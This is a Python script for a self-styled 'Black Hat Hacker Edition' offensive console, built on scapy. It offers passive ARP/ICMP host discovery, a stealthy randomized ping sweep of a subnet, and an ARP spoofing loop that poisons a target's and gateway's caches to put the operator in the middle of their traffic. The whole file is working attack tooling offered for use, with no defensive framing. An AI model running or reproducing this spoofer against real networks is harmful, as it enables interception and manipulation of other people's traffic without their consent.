#!/usr/bin/env python3
import argparse, time, random, ipaddress, os, threading, subprocess
from datetime import datetime
from scapy.all import sniff, ARP, ICMP, IP, sendp, Ether, srp
from colorama import Fore, Style, init
import netifaces

init(autoreset=True)
live_hosts, ARG_LOGFILE = {}, None

def get_default_iface():
    return netifaces.gateways()['default'][netifaces.AF_INET][1]

def show_banner():
    os.system('clear')
    print(Fore.LIGHTCYAN_EX + r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠈⢣
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⢇
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⡄⠀
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠓⢻
""")
    print(Fore.LIGHTCYAN_EX + Style.BRIGHT + "           SIGMA-CYBER-GHOST | Black Hat Hacker Edition")
    print(Fore.YELLOW + "-" * 80)
    print(Fore.YELLOW + "  Telegram : https://t.me/Sigma_Cyber_Ghost")
    print(Fore.YELLOW + "  GitHub   : https://github.com/sigma-cyber-ghost")
    print(Fore.YELLOW + "  YouTube  : https://www.youtube.com/@sigma_ghost_hacking")
    print(Fore.YELLOW + "-" * 80 + "\n")

def log(entry):
    if ARG_LOGFILE:
        with open(ARG_LOGFILE, 'a') as f:
            f.write(f"{datetime.now().isoformat()} | {entry}\n")

def handle_packet(pkt):
    if ARP in pkt and pkt[ARP].op == 1:
        ip, mac = pkt[ARP].psrc, pkt[ARP].hwsrc
    elif IP in pkt and ICMP in pkt:
        ip, mac = pkt[IP].src, pkt.src if hasattr(pkt, "src") else "Unknown"
    else:
        return
    if ip not in live_hosts:
        live_hosts[ip] = mac
        print(Fore.LIGHTGREEN_EX + f"[+] Found: {ip} ({mac})")
        log(f"Passive {ip} {mac}")

def passive_scan():
    print(Fore.CYAN + "[*] Sniffing ARP/ICMP for 30s...")
    sniff(filter="arp or icmp", timeout=30, prn=handle_packet, store=0)

def active_scan(subnet, delay=(0.05, 0.2), ttl=64):
    net = ipaddress.ip_network(subnet, strict=False)
    print(Fore.CYAN + f"[*] Active ICMP scan on {subnet}")
    def ping(ip):
        sendp(Ether()/IP(dst=str(ip), ttl=ttl)/ICMP(), verbose=0)
        print(Fore.GREEN + f"[>] Pinged: {ip}")
        log(f"Ping {ip}")
    for ip in net.hosts():
        threading.Thread(target=ping, args=(ip,)).start()
        time.sleep(random.uniform(*delay))

def get_mac(ip):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def arp_spoof(target_ip, gateway_ip, iface):
    tmac = get_mac(target_ip)
    gmac = get_mac(gateway_ip)
    if not tmac or not gmac:
        print(Fore.RED + "[!] MAC resolution failed.")
        return
    print(Fore.LIGHTRED_EX + f"[+] Spoofing {target_ip} <-> {gateway_ip}")
    try:
        while True:
            pkt1 = Ether(dst=tmac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=tmac)
            pkt2 = Ether(dst=gmac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gmac)
            sendp(pkt1, iface=iface, verbose=0)
            sendp(pkt2, iface=iface, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "[!] Restoring network...")
        restore1 = Ether(dst=tmac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=tmac)
        restore2 = Ether(dst=gmac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gmac)
        for _ in range(3):
            sendp(restore1, iface=iface, verbose=0)
            sendp(restore2, iface=iface, verbose=0)

def menu():
    while True:
        default_iface = get_default_iface()
        print(Fore.LIGHTWHITE_EX + Style.BRIGHT + """
[1] Passive Scan     → Listen silently on network (ARP/ICMP)
[2] Active Scan      → Ping sweep subnet (ICMP)
[3] ARP Spoof        → Man-in-the-middle attack
[4] Exit
""")
        choice = input(Fore.LIGHTCYAN_EX + "Choose → ").strip()
        if choice == "1":
            passive_scan()
        elif choice == "2":
            subnet = input("Enter subnet (e.g. 192.168.1.0/24): ")
            active_scan(subnet)
        elif choice == "3":
            target = input("Target IP: ")
            gateway = input("Gateway IP: ")
            iface = input(f"Interface [default: {default_iface}]: ").strip() or default_iface
            arp_spoof(target, gateway, iface)
        elif choice == "4":
            print(Fore.LIGHTRED_EX + "👋 SIGMA GHOST signing off. Silence returns.")
            break
        else:
            print(Fore.RED + "[!] Invalid input.")

def main():
    global ARG_LOGFILE
    parser = argparse.ArgumentParser(description="SIGMA GHOST | Offensive Console")
    parser.add_argument("--log", "-l", help="Log file")
    args = parser.parse_args()
    ARG_LOGFILE = args.log
    show_banner()
    menu()

if __name__ == "__main__":
    main()
